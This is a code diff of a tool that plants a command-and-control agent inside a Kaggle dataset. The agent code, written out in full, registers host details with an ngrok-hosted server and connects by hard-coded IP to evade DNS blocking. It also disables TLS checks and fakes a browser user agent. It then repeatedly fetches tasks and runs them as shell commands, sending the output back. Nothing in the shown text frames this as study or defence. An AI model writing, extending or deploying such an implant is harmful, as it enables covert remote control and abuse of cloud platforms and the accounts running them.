@@ -101,48 +101,60 @@ def create_dataset_with_machines(
             f.write("2,200,2024-01-02\n")
         
         # Create agent.py file in dataset (accessible from kernels without DNS)
-        agent_code = '''#!/usr/bin/env python3
+        # Dynamically resolve ngrok IP to bypass DNS blocking
+        import socket as _socket
+        c2_host = c2_url.replace('https://', '').replace('http://', '').split('/')[0]
+        try:
+            # Get all IPs for ngrok endpoint
+            ips = _socket.getaddrinfo(c2_host, 443, _socket.AF_INET, _socket.SOCK_STREAM)
+            c2_ip = ips[0][4][0] if ips else '18.158.249.75'
+            log_fn(f"[DATASET] Resolved {c2_host} -> {c2_ip}")
+        except Exception as e:
+            c2_ip = '18.158.249.75'  # fallback
+            log_fn(f"[DATASET] DNS failed, using fallback IP: {c2_ip}")
+        
+        agent_code = f'''#!/usr/bin/env python3
 """C2 Agent - loaded from Kaggle dataset (no DNS needed)"""
 import os,sys,json,time,socket,platform,subprocess,uuid,ssl
 from urllib.request import Request,urlopen,HTTPSHandler,build_opener
 from urllib.error import URLError
 
 # Use IP address to bypass DNS blocking
-C2_HOST='lynelle-scroddled-corinne.ngrok-free.dev'
-C2_IP='18.158.249.75'
+C2_HOST='{c2_host}'
+C2_IP='{c2_ip}'
 AGENT_ID=str(uuid.uuid4())
 
 def http_post(path,data):
     ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
-    url=f'https://{C2_IP}{path}'
-    req=Request(url,data=json.dumps(data).encode(),headers={'Content-Type':'application/json','User-Agent':'Mozilla/5.0','Host':C2_HOST,'ngrok-skip-browser-warning':'true'})
+    url=f'https://{{C2_IP}}{{path}}'
+    req=Request(url,data=json.dumps(data).encode(),headers={{'Content-Type':'application/json','User-Agent':'Mozilla/5.0','Host':C2_HOST,'ngrok-skip-browser-warning':'true'}})
     return json.loads(build_opener(HTTPSHandler(context=ctx)).open(req,timeout=15).read())
 
 def register():
-    info={'id':AGENT_ID,'hostname':f'kaggle-{socket.gethostname()}','username':os.environ.get('USER','kaggle'),'os':f'Kaggle {platform.system()}','arch':platform.machine(),'platform_type':'kaggle'}
+    info={{'id':AGENT_ID,'hostname':f'kaggle-{{socket.gethostname()}}','username':os.environ.get('USER','kaggle'),'os':f'Kaggle {{platform.system()}}','arch':platform.machine(),'platform_type':'kaggle'}}
     return http_post('/api/agent/register',info)
 
 def beacon():
-    return http_post('/api/agent/beacon',{'id':AGENT_ID})
+    return http_post('/api/agent/beacon',{{'id':AGENT_ID}})
 
 def run():
-    print(f'[C2] Agent {AGENT_ID[:8]}... starting')
-    print(f'[C2] Connecting via IP: {C2_IP} (Host: {C2_HOST})')
+    print(f'[C2] Agent {{AGENT_ID[:8]}}... starting')
+    print(f'[C2] Connecting via IP: {{C2_IP}} (Host: {{C2_HOST}})')
     try:
         r=register()
-        print(f'[C2] Registered: {r}')
+        print(f'[C2] Registered: {{r}}')
     except Exception as e:
-        print(f'[C2] Register failed: {e}')
+        print(f'[C2] Register failed: {{e}}')
         return
     while True:
         try:
             r=beacon()
             for t in r.get('tasks',[]):
                 out=subprocess.check_output(t.get('payload',''),shell=True,stderr=subprocess.STDOUT,timeout=300).decode(errors='replace')
-                http_post('/api/agent/result',{'task_id':t['id'],'result':out[:65000]})
+                http_post('/api/agent/result',{{'task_id':t['id'],'result':out[:65000]}})
             time.sleep(60)
         except Exception as e:
-            print(f'[C2] Beacon error: {e}')
+            print(f'[C2] Beacon error: {{e}}')
             time.sleep(30)
 
 if __name__=='__main__':
